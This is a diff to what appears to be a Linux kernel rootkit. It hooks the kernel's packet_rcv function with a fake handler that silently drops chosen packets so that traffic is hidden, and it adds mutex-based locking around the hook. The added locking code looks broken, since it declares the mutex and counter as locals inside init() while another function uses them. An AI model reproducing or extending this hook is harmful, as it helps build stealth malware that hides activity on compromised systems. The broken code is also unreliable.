@@ -961,13 +961,13 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 {
 	int ret;
 
-	//inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
 
 	/* Check if we need to hide packet */
 	if(packet_check(skb)) {
 		//debug("PACKET DROP");	
 		pr_info("PACKET DROP\n");
-		//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+		dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 		return NF_DROP;
 	}
 
@@ -986,7 +986,7 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	asm_hook_patch(fake_packet_rcv);
 	
 
-	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 	//debug("PACKET ACCEPT");
 	pr_info("PACKET ACCEPT\n");
 
@@ -1361,7 +1361,18 @@ int init(void)
 	
    /* PACKET HIDDING ADDINGS */	
 	
-asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
+	/* counter for access counting */
+	static int accesses_packet_rcv = 0;
+
+	/* mutexes for safe accesses */
+	struct mutex lock_packet_rcv;
+	
+	/* initialize mutexes */
+	mutex_init(&lock_packet_rcv);
+	
+	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
+	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 	
 	
 /* -----------------------*/
